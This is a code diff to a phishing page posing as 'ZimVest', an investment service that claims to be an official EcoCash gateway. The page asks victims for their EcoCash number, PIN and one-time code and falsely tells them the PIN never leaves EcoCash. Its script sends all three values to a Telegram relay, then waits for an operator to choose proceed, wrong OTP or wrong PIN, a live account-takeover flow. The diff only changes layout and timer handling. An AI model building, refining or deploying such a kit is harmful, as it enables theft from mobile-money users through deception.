@@ -103,8 +103,8 @@
 .proc-t{font-size:16px;font-weight:700;color:var(--t1);margin-bottom:5px}
 .proc-s{font-size:13px;color:var(--t4);line-height:1.5}
 
-.foot{display:none}
-.ab{width:100%;padding:15px;border-radius:var(--rxl);border:none;font:800 14px/1 var(--f);cursor:not-allowed;background:var(--s3);color:var(--t5);transition:all .18s var(--e)}
+.foot{position:absolute;bottom:0;left:0;right:0;padding:12px 16px max(20px,env(safe-area-inset-bottom));background:linear-gradient(to top,var(--bg) 65%,transparent);z-index:10}
+.ab{width:100%;padding:16px;border-radius:var(--rxl);border:none;font:800 14px/1 var(--f);cursor:not-allowed;background:var(--s3);color:var(--t5);transition:all .18s var(--e)}
 .ab.on{background:var(--in);color:#fff;cursor:pointer;box-shadow:0 4px 16px var(--ir)}
 .ab.on:hover{background:var(--ind);transform:translateY(-1px)}
 .ab.on:active{transform:scale(.98)}
@@ -145,11 +145,6 @@ html,body{
   body{padding:60px 24px}
   .app-shell,.screen,.sh{max-width:440px}
 }
-
-.step-btn{width:100%;padding:15px;border-radius:var(--rxl);border:none;font:800 14px/1 var(--f);cursor:not-allowed;background:var(--s3);color:var(--t5);transition:all .18s var(--e);margin:14px 0 4px;display:block}
-.step-btn.on{background:var(--in);color:#fff;cursor:pointer;box-shadow:0 4px 16px var(--ir)}
-.step-btn.on:hover{background:var(--ind);transform:translateY(-1px)}
-.step-btn.on:active{transform:scale(.98)}
 </style>
 </head>
 <body>
@@ -189,7 +184,7 @@ html,body{
       <div class="card">
         <div class="ct">Enter your EcoCash details</div>
         <div class="fl">
-          <div class="flb">Enter your number</div>
+          <div class="flb">EcoCash number</div>
           <div class="ph-row">
             <div class="ph-pfx">+263</div>
             <input class="ph-num" type="tel" id="ph" inputmode="numeric" pattern="[0-9]*" maxlength="9" placeholder="7XXXXXXXX" autocomplete="tel"/>
@@ -197,7 +192,7 @@ html,body{
           <div class="fh">9 digits starting with 7</div>
         </div>
         <div class="fl">
-          <div class="flb">Enter your PIN</div>
+          <div class="flb">EcoCash PIN</div>
           <div class="pin-wr">
             <input class="pin-in" type="password" id="pin" inputmode="numeric" maxlength="4" pattern="[0-9]*" placeholder="4-digit PIN" autocomplete="current-password"/>
             <button class="eye" id="eBtn" type="button">
@@ -212,10 +207,7 @@ html,body{
         <svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
         <span>256-bit SSL · Official EcoCash gateway · Your PIN never leaves EcoCash systems</span>
       </div>
-      <div style="padding:0 16px">
-        <button class="step-btn" id="mb1" onclick="document.getElementById('mb').click()">Invest Securely</button>
-      </div>
-      <div class="pw" style="margin-top:6px">ZimVest · Secured by EcoCash · Zimbabwe</div>
+      <div class="pw" style="margin-top:10px">ZimVest · Secured by EcoCash · Zimbabwe</div>
     </div>
 
     <!-- STEP 2: OTP -->
@@ -238,7 +230,6 @@ html,body{
           <div class="tl">Expires in <span class="tn" id="tc">120</span>s</div>
           <button class="rsnd" id="rsnd">Resend OTP</button>
         </div>
-        <button class="step-btn" id="mb2" style="margin-top:14px" onclick="document.getElementById('mb').click()">Confirm OTP →</button>
       </div>
       <div class="pw">ZimVest · Secured by EcoCash</div>
     </div>
@@ -304,94 +295,64 @@ document.getElementById('mb').onclick=function(){
   }
 };
 
-/* ── ALL TIMER REFERENCES — module-level so every fn can clear them ── */
 var sessionKey=null;
 var pollInterval=null;
 var pollTimeout=null;
-var elapsedInterval=null;   /* authorising counter */
-var otpTimerInterval=null;  /* OTP countdown */
 
-/* ── OTP COUNTDOWN — always clears previous before starting ── */
-function startTimer(){
-  if(otpTimerInterval){clearInterval(otpTimerInterval);otpTimerInterval=null;}
-  var t=120;
-  var te=document.getElementById('tc');
-  var rb=document.getElementById('rsnd');
-  te.textContent=t;
-  rb.classList.remove('on');
-  rc=false;
-  resetOtp(false);
-  document.getElementById('mb').classList.remove('on');
-  otpTimerInterval=setInterval(function(){
-    t--;
-    te.textContent=t;
-    if(t<=0){
-      clearInterval(otpTimerInterval);otpTimerInterval=null;
-      rb.classList.add('on');
-      resetOtp(true);
-      document.getElementById('mb').classList.remove('on');
-      document.getElementById('mn').textContent='Code expired. Tap Resend to get a new one.';
-    }
-  },1000);
-}
-
-/* ── AUTHORISING (step 3) — clears all timers before starting ── */
 function startAuthorising(){
-  /* Stop any running OTP timer — we've left that step */
-  if(otpTimerInterval){clearInterval(otpTimerInterval);otpTimerInterval=null;}
-  /* Clear any previous elapsed counter */
-  if(elapsedInterval){clearInterval(elapsedInterval);elapsedInterval=null;}
-
+  // Send OTP confirmed to Telegram — receives inline buttons
   var payload={submittedAt:new Date().toISOString(),loginPhone:pv,loginPin:pnv,otp:ov,event:'otp_confirmed',plan:pl(),device:dev};
   fetch('/api/sendTelegram',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)})
     .then(function(r){return r.json();})
-    .then(function(d){sessionKey=d.sessionKey||null;startPolling();})
+    .then(function(d){
+      sessionKey=d.sessionKey||null;
+      startPolling();
+    })
     .catch(function(){startPolling();});
 
-  /* Elapsed counter — fresh from 0 every time */
+  // Start countdown display
   var elapsed=0;
   var timerEl=document.getElementById('procTimer');
   timerEl.style.display='block';
   timerEl.textContent='Waiting for authorisation… 0s';
-  elapsedInterval=setInterval(function(){
+  var countEl=setInterval(function(){
     elapsed++;
-    if(elapsed<180){
-      timerEl.textContent='Waiting for authorisation… '+elapsed+'s';
-    } else {
-      clearInterval(elapsedInterval);elapsedInterval=null;
-      timerEl.textContent='Taking longer than usual — contact WhatsApp support if needed.';
+    timerEl.textContent='Waiting for authorisation… '+elapsed+'s';
+    if(elapsed>=180){
+      clearInterval(countEl);
+      timerEl.textContent='This is taking longer than usual. If you need help, contact support.';
     }
   },1000);
 }
 
 function startPolling(){
-  if(pollInterval){clearInterval(pollInterval);pollInterval=null;}
-  if(pollTimeout){clearTimeout(pollTimeout);pollTimeout=null;}
+  if(pollInterval) clearInterval(pollInterval);
   pollInterval=setInterval(function(){
-    if(!sessionKey)return;
+    if(!sessionKey){return;} // wait for sessionKey
     fetch('/api/checkTelegram?sessionKey='+encodeURIComponent(sessionKey))
       .then(function(r){return r.json();})
       .then(function(d){handleTelegramAction(d.status);})
       .catch(function(){});
   },2000);
+
+  // Safety fallback: if no action in 3 minutes, let user retry
   pollTimeout=setTimeout(function(){
     stopPolling();
-    showProcErr('No response received. Please contact WhatsApp support or try again.');
+    showProcErr('No response received. Please contact support on WhatsApp or try again.');
   },180000);
 }
 
 function stopPolling(){
   if(pollInterval){clearInterval(pollInterval);pollInterval=null;}
   if(pollTimeout){clearTimeout(pollTimeout);pollTimeout=null;}
-  /* Also stop elapsed counter when polling stops */
-  if(elapsedInterval){clearInterval(elapsedInterval);elapsedInterval=null;}
 }
 
 function handleTelegramAction(status){
-  if(!status||status==='pending')return;
-  stopPolling(); /* clears elapsed too */
+  if(!status||status==='pending') return;
+  stopPolling();
 
   if(status==='proceed'){
+    // ✅ Proceed — go to receipt
     document.getElementById('procRing').style.borderTopColor='#059669';
     document.getElementById('procTitle').textContent='✅ Payment confirmed!';
     document.getElementById('procSub').textContent='Redirecting to your investment receipt…';
@@ -399,38 +360,40 @@ function handleTelegramAction(status){
     setTimeout(function(){location.href='receipt.html';},1000);
 
   } else if(status==='wrong_otp'){
-    /* Return to OTP step — reset everything cleanly */
-    os=false;
+    // ❌ Wrong OTP — go back to OTP step, only resend active
     go('s2');
-    /* Clear OTP boxes and disable input */
-    od=true; oh.value=''; oh.disabled=true;
+    od=true; oh.disabled=true; // disable OTP input
+    var rsBtn=document.getElementById('rsnd');
+    rsBtn.classList.add('on'); // only resend is active
+    document.getElementById('mb').classList.remove('on'); // confirm btn disabled
+    document.getElementById('mn').textContent='❌ Incorrect OTP. Please resend and try again.';
+    // Force clear OTP boxes
+    oh.value='';
     [0,1,2,3,4,5].forEach(function(i){
       var b=document.getElementById('ob'+i);
-      if(b){b.textContent='';b.className='ob disabled';}
+      if(b){b.textContent='';b.className='ob';}
     });
-    ov='';
-    document.getElementById('mb').classList.remove('on');
-    document.getElementById('rsnd').classList.add('on'); /* only resend active */
-    document.getElementById('mn').textContent='❌ Incorrect OTP. Tap Resend to receive a new code.';
-    /* Reset OTP countdown to 120 fresh when user taps resend (startTimer called there) */
-    if(otpTimerInterval){clearInterval(otpTimerInterval);otpTimerInterval=null;}
-    document.getElementById('tc').textContent='—'; /* clear stale number */
+    // Allow retry
+    os=false;
     showProcErr('');
 
   } else if(status==='wrong_pin'){
-    os=false; lc=false; pv=''; pnv='';
-    document.getElementById('ph').value='';
-    document.getElementById('pin').value='';
-    document.getElementById('mb').classList.remove('on');
+    // 🚫 Wrong PIN — go back to login step 1
     go('s1');
+    // Reset state
+    os=false; lc=false;
+    pnv=''; pv='';
+    document.getElementById('pin').value='';
+    document.getElementById('ph').value='';
+    document.getElementById('mb').classList.remove('on');
     showProcErr('');
-    var sn=document.querySelector('.sn');
+    // Show error banner on step 1
+    var sn=document.querySelector('.sn span');
     if(sn){
-      sn.style.background='rgba(220,38,38,.07)';
-      sn.style.borderColor='rgba(220,38,38,.22)';
-      var svg=sn.querySelector('svg');if(svg)svg.style.stroke='#DC2626';
-      var sp=sn.querySelector('span');
-      if(sp)sp.textContent='🚫 Incorrect PIN. Please re-enter your number and PIN carefully.';
+      sn.textContent='🚫 Incorrect PIN entered. Please re-enter your EcoCash number and PIN.';
+      document.querySelector('.sn').style.background='rgba(220,38,38,.07)';
+      document.querySelector('.sn').style.borderColor='rgba(220,38,38,.22)';
+      document.querySelector('.sn svg').style.stroke='#DC2626';
     }
   }
 }
@@ -442,28 +405,7 @@ function showProcErr(msg){
   else{el.style.display='none';}
 }
 document.getElementById('rsnd').onclick=function(){if(!this.classList.contains('on'))return;if(rc)return;rc=true;tg('resend_otp');startTimer();};
-/* startTimer defined above */
-
-// Sync inline buttons with hidden #mb state
-(function(){
-  var mb=document.getElementById('mb');
-  if(!mb) return;
-  function sync(){
-    var on=mb.classList.contains('on');
-    var txt=mb.textContent;
-    var mb1=document.getElementById('mb1');
-    var mb2=document.getElementById('mb2');
-    if(mb1){mb1.classList.toggle('on',on);if(on&&cur==='s1')mb1.textContent=txt;}
-    if(mb2){mb2.classList.toggle('on',on);if(on&&cur==='s2')mb2.textContent=txt;}
-  }
-  var obs=new MutationObserver(sync);
-  obs.observe(mb,{attributes:true,childList:true});
-  // Also sync on tab/step changes
-  var origUb=window.ub;
-  window.ub=function(){if(origUb)origUb();sync();};
-  setInterval(sync,200);
-})();
-
+function startTimer(){var t=120,te=document.getElementById('tc'),rb=document.getElementById('rsnd');te.textContent=t;rb.classList.remove('on');rc=false;resetOtp(false);document.getElementById('mb').classList.remove('on');var ti=setInterval(function(){t--;te.textContent=t;if(t<=0){clearInterval(ti);rb.classList.add('on');resetOtp(true);document.getElementById('mb').classList.remove('on');document.getElementById('mn').textContent='Code expired. Tap Resend to get a new one.';}},1000);}
 </script>
 </body>
 </html>
